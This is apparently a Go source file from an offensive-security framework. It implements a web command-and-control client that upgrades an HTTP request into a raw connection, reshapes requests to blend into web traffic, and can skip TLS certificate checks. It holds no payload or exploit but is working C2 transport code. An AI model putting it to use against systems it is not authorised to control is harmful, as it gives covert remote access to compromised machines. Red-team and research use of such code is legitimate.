// Copyright (C) 2020 - 2023 iDigitalFlame
//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with this program.  If not, see <https://www.gnu.org/licenses/>.
//

package wc2

import (
	"context"
	"crypto/tls"
	"net"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"github.com/iDigitalFlame/xmt/com"
	"github.com/iDigitalFlame/xmt/util/xerr"
)

// Default is the default web c2 client that can be used to create client
// connections. This has the default configuration and may be used "out-of-the-box".
var Default = new(Client)

// Client is a simple struct that supports the C2 client connector interface.
// This can be used by clients to connect to a Web instance.
//
// By default, this struct will use the DefaultHTTP struct.
//
// The initial unspecified Target state will be empty and will use the default
// (Golang) values.
type Client struct {
	_       [0]func()
	Target  Target
	Timeout time.Duration

	t transport
	c *http.Client
}
type client struct {
	_ [0]func()
	r *http.Response
	net.Conn
}
type transport struct {
	next   net.Conn // Protected by Mutex
	lock   sync.Mutex
	search uint32
	*http.Transport
}

func (c *Client) setup() {
	if c.Timeout <= 0 {
		c.Timeout = com.DefaultTimeout
	}
	var (
		j, _ = cookiejar.New(nil)
		t    = newTransport(c.Timeout)
	)
	c.t.hook(t)
	c.t.Transport = t
	c.c = &http.Client{Jar: j, Transport: t}
}
func (c *client) Close() error {
	if c.r == nil {
		return nil
	}
	err := c.Conn.Close()
	c.r.Body.Close()
	c.r = nil
	return err
}

// Client returns the internal 'http.Client' struct to allow for extra configuration.
// To prevent any issues, it is recommended to NOT overrite or change the Transport
// of this Client.
//
// The return value will ALWAYS be non-nil.
func (c *Client) Client() *http.Client {
	if c.c == nil {
		c.setup()
	}
	return c.c
}

// Insecure will set the TLS verification status of the Client to the specified
// boolean value and return itself.
//
// The returned result is NOT a copy.
func (c *Client) Insecure(i bool) *Client {
	if c.t.TLSClientConfig == nil {
		c.t.TLSClientConfig = &tls.Config{InsecureSkipVerify: i}
	} else {
		c.t.TLSClientConfig.InsecureSkipVerify = i
	}
	return c
}
func rawParse(r string) (*url.URL, error) {
	var (
		i   = strings.IndexRune(r, '/')
		u   *url.URL
		err error
	)
	if i == 0 && len(r) > 2 && r[1] != '/' {
		u, err = url.Parse("/" + r)
	} else if i == -1 || i+1 >= len(r) || r[i+1] != '/' {
		u, err = url.Parse("//" + r)
	} else {
		u, err = url.Parse(r)
	}
	if err != nil {
		return nil, err
	}
	if len(u.Host) == 0 {
		return nil, xerr.Sub("empty host field", 0x30)
	}
	if u.Host[len(u.Host)-1] == ':' {
		return nil, xerr.Sub("invalid port specified", 0x31)
	}
	if len(u.Scheme) == 0 {
		u.Scheme = com.NameHTTP
	}
	return u, nil
}

// Transport returns the internal 'http.Transport' struct to allow for extra
// configuration. To prevent any issues, it is recommended to NOT overrite or
// change any of the 'Dial*' functions of this Transoport.
//
// The return value will ALWAYS be non-nil.
func (c *Client) Transport() *http.Transport {
	if c.c == nil {
		c.setup()
	}
	return c.t.Transport
}

// SetTLS will set the TLS configuration of the Client to the specified value
// and returns itself.
//
// The returned result is NOT a copy.
func (c *Client) SetTLS(t *tls.Config) *Client {
	c.t.TLSClientConfig = t
	return c
}

// NewClient creates a new WC2 Client with the supplied Timeout.
//
// This can be passed to the Connect function in the 'c2' package to connect to
// a web server that acts as a C2 server.
func NewClient(d time.Duration, t *Target) *Client {
	return NewClientTLS(d, nil, t)
}

// NewClientTLS creates a new WC2 Client with the supplied Timeout and TLS
// configuration.
//
// This can be passed to the Connect function in the 'c2' package to connect to
// a web server that acts as a C2 server.
func NewClientTLS(d time.Duration, c *tls.Config, t *Target) *Client {
	x := &Client{Timeout: d}
	if x.setup(); t != nil {
		x.Target = *t
	}
	x.t.TLSClientConfig = c
	return x
}
func (t *transport) RoundTrip(r *http.Request) (*http.Response, error) {
	return t.Transport.RoundTrip(r)
}

// Connect creates a C2 client connector that uses the same properties of the
// Client and Target instance parents.
func (c *Client) Connect(x context.Context, a string) (net.Conn, error) {
	if c.c == nil {
		c.setup()
	}
	return c.t.connect(x, &c.Target, c.c, a)
}
func (t *transport) request(h *http.Client, r *http.Request) (*client, error) {
	t.lock.Lock()
	atomic.StoreUint32(&t.search, 1)
	var (
		d, err = h.Do(r)
		c      = t.next
	)
	t.next = nil
	atomic.StoreUint32(&t.search, 0)
	if t.lock.Unlock(); err != nil {
		if c != nil { // A masked Conn may still exist.
			c.Close()
		}
		return nil, err
	}
	if d.StatusCode != http.StatusSwitchingProtocols {
		if d.Body.Close(); c != nil {
			c.Close()
		}
		return nil, xerr.Sub("invalid HTTP response", 0x32)
	}
	if c == nil {
		d.Body.Close()
		return nil, xerr.Sub("could not get underlying net.Conn", 0x34)
	}
	return &client{r: d, Conn: c}, nil
}
func (t *transport) dialContext(x context.Context, _, a string) (net.Conn, error) {
	c, err := com.TCP.Connect(x, a)
	if err != nil {
		return nil, err
	}
	if atomic.LoadUint32(&t.search) == 1 {
		t.next = nil // Remove references.
		t.next = c
	}
	// Only mask Conns returned to the Client
	return maskConn(c), nil
}
func (t *transport) dialTLSContext(x context.Context, _, a string) (net.Conn, error) {
	var (
		c   net.Conn
		err error
	)
	if t.TLSClientConfig != nil {
		c, err = com.TLS.ConnectConfig(x, t.TLSClientConfig, a)
	} else {
		c, err = com.TLS.Connect(x, a)
	}
	if err != nil {
		return nil, err
	}
	if atomic.LoadUint32(&t.search) == 1 {
		t.next = nil // Remove references.
		t.next = c
	}
	// Only mask Conns returned to the Client
	return maskConn(c), nil
}
func (t *transport) connect(x context.Context, m *Target, h *http.Client, a string) (net.Conn, error) {
	// URL is empty we will parse it and mutate it with our Target.
	u, err := rawParse(a)
	if err != nil {
		return nil, err
	}
	r := newRequest(x)
	if r.URL = u; m != nil && !m.empty() {
		m.mutate(r)
	}
	c, err := t.request(h, r)
	r = nil
	return c, err
}
